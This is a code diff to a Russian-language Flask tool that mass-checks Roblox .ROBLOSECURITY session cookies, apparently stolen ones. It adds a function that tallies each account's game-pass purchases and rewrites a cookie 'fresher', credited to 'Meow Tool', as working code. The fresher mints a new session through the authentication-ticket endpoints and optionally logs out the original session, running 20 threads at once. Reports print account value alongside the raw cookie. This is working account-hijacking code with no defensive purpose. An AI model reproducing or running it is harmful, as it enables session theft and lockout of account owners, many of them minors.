@@ -9,6 +9,7 @@ import json
 import requests
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
+import time
 
 from flask import Flask, render_template_string, request, jsonify, send_file
 from flask_socketio import SocketIO, emit
@@ -237,13 +238,11 @@ socket.on('mass_complete', function(data) {
     document.getElementById('massBtn').disabled = false;
     document.getElementById('massBtn').textContent = '🚀 Запустить массовый чек';
     
-    // Перезаписываем massResult и высвечиваем полный итоговый отчет
     document.getElementById('massContainer').style.display = 'block';
     document.getElementById('massResult').style.display = 'block';
     document.getElementById('massResult').textContent = data.message;
     document.getElementById('massResult').scrollTop = 0;
 
-    // Обновляем статистику в шапке
     document.getElementById('statValid').textContent = data.valid_count || 0;
     document.getElementById('statRobux').textContent = (data.total_robux || 0).toLocaleString();
     document.getElementById('statPremium').textContent = data.premium_count || 0;
@@ -579,6 +578,61 @@ def clean_cookie(cookie_str):
             return match.group(1)
     return cookie_str
 
+def get_game_purchases(user_id, cookie):
+    """Парсит геймпассы по популярным играм"""
+    headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
+    
+    TARGET_GAMES = [
+        'Adopt Me', 'Blox Fruits', 'Murder Mystery 2', 'Rivals',
+        'Pet Simulator 99', 'Pet Simulator X', 'Arsenal', 'BedWars',
+        'Tower Defense Simulator', 'Anime Adventures'
+    ]
+    
+    purchases_by_game = {}
+    total_spent = 0
+    
+    try:
+        cursor = ""
+        page = 0
+        while page < 5:
+            url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?limit=100&transactionType=Purchase"
+            if cursor:
+                url += f"&cursor={cursor}"
+            r = requests.get(url, headers=headers, timeout=10)
+            if r.status_code != 200:
+                break
+            data = r.json()
+            for item in data.get('data', []):
+                price = abs(item.get('currency', {}).get('amount', 0))
+                if price < 10:
+                    continue
+                game_name = item.get('details', {}).get('place', {}).get('name', 'Другие игры')
+                item_name = item.get('details', {}).get('name', 'Товар')
+                
+                # Проверяем, входит ли игра в список популярных
+                matched = False
+                for target in TARGET_GAMES:
+                    if target.lower() in game_name.lower() or game_name.lower() in target.lower():
+                        matched = True
+                        break
+                if not matched:
+                    continue
+                
+                if game_name not in purchases_by_game:
+                    purchases_by_game[game_name] = []
+                purchases_by_game[game_name].append({'name': item_name, 'price': price})
+                total_spent += price
+                
+            cursor = data.get('nextPageCursor')
+            if not cursor:
+                break
+            page += 1
+            time.sleep(0.1)
+    except:
+        pass
+    
+    return purchases_by_game, total_spent
+
 def get_account_data(cookie):
     cookie = clean_cookie(cookie)
     headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
@@ -616,16 +670,20 @@ def get_account_data(cookie):
         data = res_rap.json().get("data", [])
         rap = sum(item.get("recentAveragePrice", 0) for item in data)
         
-    # 5. Summary Stats (Pending, Credit)
+    # 5. Pending Robux
     pending_robux = 0
     res_pend = requests.get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=summary", headers=headers)
     if res_pend.status_code == 200:
         pending_robux = res_pend.json().get("pendingRobuxTotal", 0)
         
+    # 6. Credit
     credit = "0.00"
     res_cred = requests.get("https://billing.roblox.com/v1/credit", headers=headers)
     if res_cred.status_code == 200:
         credit = f"{res_cred.json().get('balance', 0):.2f}"
+    
+    # 7. Game Purchases (геймпассы по популярным играм)
+    game_purchases, game_total_spent = get_game_purchases(user_id, cookie)
         
     return {
         "user_id": user_id,
@@ -637,7 +695,9 @@ def get_account_data(cookie):
         "is_premium": is_premium,
         "created_date": created_date,
         "rap": rap,
-        "cookie": cookie
+        "cookie": cookie,
+        "game_purchases": game_purchases,
+        "game_total_spent": game_total_spent
     }
 
 def format_single_report(info):
@@ -657,46 +717,156 @@ def format_single_report(info):
 💳 Баланс / Credit: ${info['credit']}
 💎 RAP (Коллекционка): {info['rap']:,}
 ========================================
+📦 ГЕЙМПАССЫ (популярные игры):
+"""
+    
+    if info['game_purchases']:
+        sorted_games = sorted(info['game_purchases'].items(), 
+                             key=lambda x: sum(p['price'] for p in x[1]), 
+                             reverse=True)
+        for game, passes in sorted_games:
+            total = sum(p['price'] for p in passes)
+            report += f"\n  🎮 {game} — {len(passes)} гп, ⏣ {total:,}"
+            for p in passes[:3]:
+                report += f"\n     └─ {p['name']} — ⏣ {p['price']:,}"
+            if len(passes) > 3:
+                report += f"\n     └─ ... и ещё {len(passes) - 3}"
+        report += f"\n\n💰 Всего потрачено на геймпассы: ⏣ {info['game_total_spent']:,}"
+    else:
+        report += "\n  ❌ Геймпассов в популярных играх не найдено"
+    
+    report += f"""
+========================================
 🍪 Кук:
 {info['cookie']}
 ========================================"""
     return report
 
+# ==================== ФРЕШЕР ИЗ MEOW TOOL ====================
 def refresh_cookie_action(cookie, mode="duplicate"):
+    """Фрешер из Meow Tool - стабильная версия"""
     cookie = clean_cookie(cookie)
-    headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
+    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
     
-    # 1. Получаем CSRF Токен
-    res = requests.post("https://auth.roblox.com/v1/login", headers=headers)
-    csrf_token = res.headers.get("x-csrf-token")
-    if not csrf_token:
-        return None
-    
-    headers["X-CSRF-TOKEN"] = csrf_token
-    
-    # 2. Вызываем перевыпуск
-    res_refresh = requests.post("https://auth.roblox.com/v1/authentication-ticket", headers=headers)
-    ticket = res_refresh.headers.get("rbx-authentication-ticket")
-    if not ticket:
-        return None
+    try:
+        c = cookie.strip()
+        if ".ROBLOSECURITY=" in c:
+            c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
         
-    res_new = requests.post("https://auth.roblox.com/v1/authentication-ticket/redeem", 
-                            json={"authenticationTicket": ticket}, 
-                            headers={"User-Agent": "Mozilla/5.0"})
-    
-    new_cookie = None
-    for c in res_new.cookies:
-        if c.name == ".ROBLOSECURITY":
-            new_cookie = c.value
-            break
+        cookies_dict = {'.ROBLOSECURITY': c}
+        
+        # ШАГ 1: Проверка валидности
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'application/json, text/plain, */*'
+        }
+        
+        check_r = requests.get('https://users.roblox.com/v1/users/authenticated',
+                               cookies=cookies_dict, headers=headers, timeout=10)
+        
+        if check_r.status_code != 200:
+            result['error'] = "Кука невалидна"
+            return result
+        
+        user_data = check_r.json()
+        result['username'] = user_data.get('name', '?')
+        result['user_id'] = user_data.get('id', '?')
+        
+        # ШАГ 2: Получение CSRF токена
+        csrf_r = requests.post('https://auth.roblox.com/v2/logout',
+                               cookies=cookies_dict,
+                               headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'},
+                               timeout=10)
+        csrf_token = csrf_r.headers.get('x-csrf-token')
+        if not csrf_token:
+            result['error'] = "CSRF token not found"
+            return result
+        
+        # ШАГ 3: Получение authentication ticket
+        ticket_headers = {
+            'User-Agent': 'Mozilla/5.0',
+            'RBXauthenticationNegotiation': '1',
+            'Referer': 'https://www.roblox.com/',
+            'X-CSRF-Token': csrf_token,
+            'Content-Type': 'application/json'
+        }
+        
+        ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket',
+                                 headers=ticket_headers, cookies=cookies_dict, json={}, timeout=15)
+        auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
+        if not auth_ticket:
+            result['error'] = "Auth ticket not found"
+            return result
+        
+        # ШАГ 4: Redeem ticket
+        redeem_headers = {
+            'User-Agent': 'Mozilla/5.0',
+            'RBXauthenticationNegotiation': '1',
+            'Content-Type': 'application/json'
+        }
+        
+        redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem',
+                                 headers=redeem_headers,
+                                 json={"authenticationTicket": auth_ticket},
+                                 timeout=15)
+        
+        # ШАГ 5: Извлечение новой куки
+        new_cookie = None
+        
+        set_cookie = redeem_r.headers.get('Set-Cookie', '')
+        if '.ROBLOSECURITY=' in set_cookie:
+            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
+            if match:
+                new_cookie = match.group(1)
+        
+        if not new_cookie:
+            for co in redeem_r.cookies:
+                if co.name == '.ROBLOSECURITY' and co.value:
+                    new_cookie = co.value
+                    break
+        
+        if not new_cookie:
+            result['error'] = "New cookie not found"
+            return result
+        
+        # ШАГ 6: Убить старую куку (опционально)
+        if mode == "kill":
+            try:
+                kill_headers = {
+                    'User-Agent': 'Mozilla/5.0',
+                    'X-CSRF-Token': csrf_token,
+                    'Content-Type': 'application/json'
+                }
+                requests.post('https://auth.roblox.com/v2/logout',
+                              headers=kill_headers, cookies=cookies_dict, timeout=10)
+            except:
+                pass
+        
+        # ШАГ 7: Проверка новой куки
+        test_s = requests.Session()
+        test_s.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
+        
+        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated',
+                            cookies={'.ROBLOSECURITY': new_cookie}, timeout=10)
+        
+        if test_r.status_code == 200 and 'id' in test_r.json():
+            result['new_cookie'] = new_cookie
+            result['success'] = True
+            result['username'] = test_r.json().get('name', result['username'])
+        else:
+            result['error'] = "New cookie validation failed"
             
-    if not new_cookie:
-        return None
-        
-    if mode == "kill":
-        requests.post("https://auth.roblox.com/v1/logout", headers=headers)
-        
-    return new_cookie
+    except Exception as e:
+        result['error'] = str(e)
+    
+    return result
+
+def refresh_cookie_simple(cookie, mode="duplicate"):
+    """Упрощенный фрешер для массового обновления"""
+    result = refresh_cookie_action(cookie, mode)
+    if result['success']:
+        return result['new_cookie']
+    return None
 
 # ==================== ЭНДПОИНТЫ API ====================
 @app.route('/')
@@ -813,7 +983,7 @@ def run_fresher_api():
     usernames = []
     
     with ThreadPoolExecutor(max_workers=20) as executor:
-        futures = [executor.submit(refresh_cookie_action, c, mode) for c in cookies]
+        futures = [executor.submit(refresh_cookie_simple, c, mode) for c in cookies]
         for f in as_completed(futures):
             res = f.result()
             if res:
